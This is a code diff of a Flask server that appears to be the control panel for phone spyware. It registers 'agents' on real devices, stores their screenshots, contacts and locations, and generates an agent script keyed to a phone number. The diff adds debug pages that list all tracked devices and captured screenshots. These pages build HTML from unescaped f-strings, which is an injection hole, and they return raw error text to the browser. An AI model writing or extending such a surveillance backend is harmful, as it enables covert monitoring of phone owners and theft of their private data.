@@ -249,6 +249,7 @@ def dashboard():
             }
             
             agents = safe_fetchall(conn.execute("SELECT * FROM agents WHERE status='active' ORDER BY last_seen DESC LIMIT 10"))
+            all_agents = safe_fetchall(conn.execute("SELECT * FROM agents ORDER BY last_seen DESC"))
             screenshots = safe_fetchall(conn.execute('''
                 SELECT s.*, a.phone_model FROM screenshots s 
                 LEFT JOIN agents a ON s.agent_id = a.agent_id 
@@ -263,6 +264,7 @@ def dashboard():
         return render_template('dashboard.html',
                              stats=stats,
                              agents=agents,
+                             all_agents=all_agents,
                              screenshots=screenshots,
                              contacts=contacts,
                              locations=locations,
@@ -289,6 +291,7 @@ def admin_dashboard():
             }
             
             agents = safe_fetchall(conn.execute("SELECT * FROM agents ORDER BY last_seen DESC LIMIT 20"))
+            all_agents = safe_fetchall(conn.execute("SELECT * FROM agents ORDER BY last_seen DESC"))
             screenshots = safe_fetchall(conn.execute('''
                 SELECT s.*, a.phone_model FROM screenshots s 
                 LEFT JOIN agents a ON s.agent_id = a.agent_id 
@@ -305,6 +308,7 @@ def admin_dashboard():
         return render_template('admin_dashboard.html',
                              stats=stats,
                              agents=agents,
+                             all_agents=all_agents,
                              screenshots=screenshots,
                              contacts=contacts,
                              locations=locations,
@@ -315,7 +319,7 @@ def admin_dashboard():
         logger.error(f"Admin dashboard error: {e}")
         return "Error loading admin dashboard", 500
 
-# ==================== DEBUG ROUTES (MISSING ROUTES FIX) ====================
+# ==================== DEBUG ROUTES ====================
 
 @app.route('/debug/agents')
 def debug_agents():
@@ -328,10 +332,42 @@ def debug_agents():
             agents = safe_fetchall(conn.execute("SELECT * FROM agents ORDER BY last_seen DESC"))
             conn.close()
         
-        return render_template('debug_agents.html', agents=agents)
+        html = '''
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>Debug - All Agents</title>
+            <style>
+                body { font-family: Arial; padding: 20px; background: #1a1a1a; color: white; }
+                .agent { background: #2d2d2d; padding: 15px; margin: 10px 0; border-radius: 8px; }
+                .active { border-left: 4px solid #4CAF50; }
+                .inactive { border-left: 4px solid #f44336; }
+            </style>
+        </head>
+        <body>
+            <h1>🔧 Debug - All Agents ({{ count }})</h1>
+            <a href="/admin">← Back to Admin</a>
+            <div style="margin: 20px 0;">
+        '''
+        
+        for agent in agents:
+            status_class = 'active' if agent.get('status') == 'active' else 'inactive'
+            html += f'''
+            <div class="agent {status_class}">
+                <h3>🆔 {agent['agent_id']}</h3>
+                <p><strong>Status:</strong> {agent.get('status', 'unknown')}</p>
+                <p><strong>Model:</strong> {agent.get('phone_model', 'Unknown')}</p>
+                <p><strong>Last Seen:</strong> {agent.get('last_seen', 'Never')}</p>
+                <p><strong>First Seen:</strong> {agent.get('first_seen', 'Never')}</p>
+                <p><strong>IP:</strong> {agent.get('ip_address', 'Unknown')}</p>
+                <p><strong>Screenshots:</strong> {agent.get('screenshot_count', 0)}</p>
+            </div>
+            '''
+        
+        html += '</div></body></html>'
+        return html.replace('{{ count }}', str(len(agents)))
     except Exception as e:
-        logger.error(f"Debug agents error: {e}")
-        return "Error loading agents", 500
+        return f"Error: {e}", 500
 
 @app.route('/debug/screenshots')
 def debug_screenshots():
@@ -342,19 +378,50 @@ def debug_screenshots():
         with db_lock:
             conn = get_db_connection()
             screenshots = safe_fetchall(conn.execute('''
-                SELECT s.*, a.phone_model FROM screenshots s 
+                SELECT s.*, a.agent_id, a.phone_model 
+                FROM screenshots s 
                 LEFT JOIN agents a ON s.agent_id = a.agent_id 
                 ORDER BY s.timestamp DESC
             '''))
             conn.close()
         
-        return render_template('debug_screenshots.html', screenshots=screenshots)
+        html = '''
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>Debug - All Screenshots</title>
+            <style>
+                body { font-family: Arial; padding: 20px; background: #1a1a1a; color: white; }
+                .screenshot { background: #2d2d2d; padding: 15px; margin: 10px 0; border-radius: 8px; }
+                img { max-width: 300px; border: 1px solid #555; }
+            </style>
+        </head>
+        <body>
+            <h1>🔧 Debug - All Screenshots ({{ count }})</h1>
+            <a href="/admin">← Back to Admin</a>
+            <div style="margin: 20px 0;">
+        '''
+        
+        for screenshot in screenshots:
+            html += f'''
+            <div class="screenshot">
+                <h3>🖼️ Screenshot from {screenshot['agent_id']}</h3>
+                <p><strong>Time:</strong> {screenshot.get('timestamp', 'Unknown')}</p>
+                <p><strong>Device:</strong> {screenshot.get('phone_model', 'Unknown')}</p>
+                <a href="/media/screenshot/{screenshot['id']}" target="_blank">
+                    <img src="/media/screenshot/{screenshot['id']}" alt="Screenshot" 
+                         onerror="this.style.display='none'; this.parentNode.innerHTML+='<div style=color:red>Image not available</div>';">
+                </a>
+            </div>
+            '''
+        
+        html += '</div></body></html>'
+        return html.replace('{{ count }}', str(len(screenshots)))
     except Exception as e:
-        logger.error(f"Debug screenshots error: {e}")
-        return "Error loading screenshots", 500
+        return f"Error: {e}", 500
 
 @app.route('/debug/clear_data')
-def clear_data():
+def debug_clear_data():
     if not session.get('authenticated'):
         return redirect('/login')
     
@@ -370,80 +437,14 @@ def clear_data():
             conn.commit()
             conn.close()
         
-        log_event('INFO', 'All data cleared by admin')
-        return redirect('/admin')
+        return '''
+        <script>
+            alert("All data cleared successfully!");
+            window.location.href = "/admin";
+        </script>
+        '''
     except Exception as e:
-        logger.error(f"Clear data error: {e}")
-        return "Error clearing data", 500
-
-@app.route('/admin/contacts/<agent_id>')
-def view_contacts(agent_id):
-    if not session.get('authenticated'):
-        return redirect('/login')
-    
-    try:
-        with db_lock:
-            conn = get_db_connection()
-            contacts = safe_fetchall(conn.execute(
-                "SELECT * FROM contacts WHERE agent_id=? ORDER BY timestamp DESC", 
-                (agent_id,)
-            ))
-            agent = safe_fetchone(conn.execute(
-                "SELECT agent_id FROM agents WHERE agent_id=?", (agent_id,)
-            ))
-            conn.close()
-        
-        if not agent:
-            return "Agent not found", 404
-        
-        return render_template('contacts.html', contacts=contacts, agent_id=agent_id)
-    except Exception as e:
-        logger.error(f"View contacts error: {e}")
-        return "Error loading contacts", 500
-
-@app.route('/admin/locations/<agent_id>')
-def view_locations(agent_id):
-    if not session.get('authenticated'):
-        return redirect('/login')
-    
-    try:
-        with db_lock:
-            conn = get_db_connection()
-            locations = safe_fetchall(conn.execute(
-                "SELECT * FROM locations WHERE agent_id=? ORDER BY timestamp DESC", 
-                (agent_id,)
-            ))
-            agent = safe_fetchone(conn.execute(
-                "SELECT agent_id FROM agents WHERE agent_id=?", (agent_id,)
-            ))
-            conn.close()
-        
-        if not agent:
-            return "Agent not found", 404
-        
-        return render_template('locations.html', locations=locations, agent_id=agent_id)
-    except Exception as e:
-        logger.error(f"View locations error: {e}")
-        return "Error loading locations", 500
-
-@app.route('/admin/remove_agent/<agent_id>')
-def remove_agent(agent_id):
-    if not session.get('authenticated'):
-        return redirect('/login')
-    
-    try:
-        with db_lock:
-            conn = get_db_connection()
-            conn.execute("DELETE FROM agents WHERE agent_id=?", (agent_id,))
-            conn.execute("DELETE FROM commands WHERE agent_id=?", (agent_id,))
-            conn.commit()
-            conn.close()
-        
-        log_event('INFO', f'Agent removed: {agent_id}')
-        return redirect('/admin')
-    except Exception as e:
-        logger.error(f"Remove agent error: {e}")
-        return "Error removing agent", 500
+        return f"Error clearing data: {e}", 500
 
 # ==================== AGENT DOWNLOAD ROUTE ====================
 
@@ -626,58 +627,7 @@ python agent.py "{phone}" "{platform_url}"
     except Exception as e:
         logger.error(f"Download agent error: {e}")
         return "Error generating agent script", 500
-
 # ==================== AGENT API ROUTES ====================
-
-@app.route('/api/agent/register', methods=['POST'])
-def register_agent():
-    """Register real devices"""
-    try:
-        data = request.get_json() or {}
-        agent_id = data.get('agent_id')
-        
-        if not agent_id:
-            return jsonify({'status': 'error', 'message': 'Agent ID required'}), 400
-        
-        phone_model = data.get('phone_model', 'Real Device')
-        android_version = data.get('android_version', 'Real Android')
-        ip_address = request.remote_addr
-        user_agent = request.headers.get('User-Agent', 'Unknown')
-        
-        with db_lock:
-            conn = get_db_connection()
-            current_time = datetime.now()
-            
-            existing = safe_fetchone(conn.execute(
-                "SELECT * FROM agents WHERE agent_id = ?", (agent_id,)
-            ))
-            
-            if existing:
-                conn.execute('''
-                    UPDATE agents SET 
-                    phone_model=?, android_version=?, ip_address=?, user_agent=?,
-                    status='active', last_seen=?, is_real_device=1
-                    WHERE agent_id=?
-                ''', (phone_model, android_version, ip_address, user_agent, current_time, agent_id))
-            else:
-                conn.execute('''
-                    INSERT INTO agents 
-                    (agent_id, phone_model, android_version, ip_address, user_agent, 
-                     status, first_seen, last_seen, is_real_device)
-                    VALUES (?, ?, ?, ?, ?, 'active', ?, ?, 1)
-                ''', (agent_id, phone_model, android_version, ip_address, user_agent, 
-                      current_time, current_time))
-            
-            conn.commit()
-            conn.close()
-        
-        log_event('INFO', f'Agent registered: {agent_id}')
-        return jsonify({'status': 'success', 'message': 'Registered'})
-        
-    except Exception as e:
-        logger.error(f"Register error: {e}")
-        return jsonify({'status': 'error', 'message': str(e)}), 500
-
 @app.route('/api/agent/submit_report', methods=['POST'])
 def submit_report():
     """Receive real data reports"""
